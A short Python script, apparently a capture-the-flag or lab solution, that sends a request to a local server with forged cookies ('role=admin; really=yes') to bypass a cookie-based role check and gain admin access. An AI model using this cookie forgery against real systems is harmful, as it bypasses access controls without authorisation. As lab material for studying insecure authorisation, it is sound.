import requests
url = "http://localhost:8085"

headers = {
    "Cookie": "role=admin; really=yes"
}

response = requests.get(url, headers=headers)
print(response.text)